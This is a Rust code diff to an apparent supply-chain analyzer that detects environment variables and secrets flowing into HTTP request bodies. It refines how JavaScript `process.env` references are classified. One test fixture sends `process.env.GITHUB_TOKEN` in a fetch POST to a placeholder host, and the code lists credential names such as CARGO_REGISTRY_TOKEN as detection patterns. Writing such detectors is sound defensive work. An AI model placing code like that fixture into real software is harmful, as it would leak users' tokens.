@@ -24,6 +24,10 @@ const CARGOHOME: Bits = 1024;
 const CREDFILENAME: Bits = 2048;
 const CURL_COMMAND: Bits = 4096;
 const CURL_DATA_NEXT: Bits = 8192;
+// A JavaScript process.env reference is a collection until code selects a
+// property. Keep that state separate from a bulk environment read so aliases
+// such as `const env = process.env` can refine non-secret configuration keys.
+const ENV_OBJECT: Bits = 16384;
 const PARAM_START: usize = 24;
 const PARAM_COUNT: usize = 16;
 const LIMIT: usize = 200_000;
@@ -355,6 +359,12 @@ pub fn go_package_payload_flow(sources: &[(&str, &str)]) -> serde_json::Value {
 
 fn events_for(summary: &Summary, name: &str, offset: usize) -> Vec<serde_json::Value> {
     let mut events = Vec::new();
+    let body = summary.body
+        | if summary.body & ENV_OBJECT != 0 {
+            ENV | SECRET
+        } else {
+            0
+        };
     for (bit, kind) in [
         (ENV, "environment-http-body"),
         (SECRET, "secret-http-body"),
@@ -362,7 +372,7 @@ fn events_for(summary: &Summary, name: &str, offset: usize) -> Vec<serde_json::V
         (FILE, "file-http-body"),
         (CREDFILE, "credential-file-http-body"),
     ] {
-        if summary.body & bit != 0 {
+        if body & bit != 0 {
             events.push(json!({"kind":kind,"function":name,"offset":offset}));
         }
     }
@@ -653,12 +663,50 @@ impl<'s, 't> Analysis<'s, 't> {
                 return CLIENT;
             }
             if canonical == "os.environ" || canonical == "process.env" {
+                if self.language == "javascript" || self.language == "typescript" {
+                    return ENV_OBJECT;
+                }
                 return ENV | SECRET;
             }
-            if canonical.starts_with("os.environ[")
-                || canonical.starts_with("process.env.")
-                || canonical.starts_with("process.env[")
-            {
+            if matches!(self.language, "javascript" | "typescript") {
+                let object = node
+                    .child_by_field_name("object")
+                    .or_else(|| node.child_by_field_name("value"));
+                let property = node
+                    .child_by_field_name("property")
+                    .or_else(|| node.child_by_field_name("field"));
+                let object_bits = object.map(|object| self.eval(object, bindings, out, depth + 1));
+                if object_bits.is_some_and(|bits| bits & ENV_OBJECT != 0) {
+                    if let Some(property) = property {
+                        return env_bits(self.text(property));
+                    }
+                    let index = node
+                        .child_by_field_name("index")
+                        .or_else(|| node.child_by_field_name("subscript"));
+                    if let Some(index) = index {
+                        let key = self.text(index).trim_matches(['\'', '"', '`']);
+                        if key != self.text(index) {
+                            return env_bits(key);
+                        }
+                    }
+                    // A dynamic key may select a credential, so retain the
+                    // conservative source classification.
+                    return ENV | SECRET;
+                }
+                if is_env_member(&canonical) {
+                    return env_bits(text);
+                }
+                // `object` is already evaluated; letting the fallback `all`
+                // evaluate it again would double the work at every link of a
+                // member chain.
+                return children(node)
+                    .into_iter()
+                    .filter(|child| Some(*child) != object)
+                    .fold(object_bits.unwrap_or(0), |bits, child| {
+                        bits | self.eval(child, bindings, out, depth + 1)
+                    });
+            }
+            if is_env_member(&canonical) {
                 return env_bits(text);
             }
         }
@@ -1044,6 +1092,12 @@ fn substitute(value: Bits, args: &[Bits]) -> Bits {
     result
 }
 
+fn is_env_member(canonical: &str) -> bool {
+    canonical.starts_with("os.environ[")
+        || canonical.starts_with("process.env.")
+        || canonical.starts_with("process.env[")
+}
+
 fn env_bits(name: &str) -> Bits {
     if name.contains("CARGO_REGISTRY_TOKEN")
         || name.contains("CARGO_REGISTRIES_") && name.contains("_TOKEN")
@@ -1173,6 +1227,21 @@ mod tests {
                 "{body}"
             );
         }
+    }
+    #[test]
+    fn long_javascript_member_chain_stays_within_budget() {
+        // Each link used to be evaluated twice, so a few dozen links spent
+        // the whole step budget and hid every later event.
+        let chain = (0..40).fold(String::from("a"), |chain, i| format!("{chain}.p{i}"));
+        let source = format!(
+            "const x={chain}; fetch('https://example.invalid',{{method:'POST',body:JSON.stringify({{token:process.env.GITHUB_TOKEN}})}});"
+        );
+        let parsed = open_with_path(Path::new("index.js"), source.as_bytes()).unwrap();
+        assert_eq!(
+            parsed.values().get("source.payload_flow.truncated"),
+            Some(&serde_json::json!(false))
+        );
+        assert!(kinds("index.js", &source).contains("secret-http-body"));
     }
     #[test]
     fn lexical_shadowing_does_not_leak_or_erase_outer_payload() {
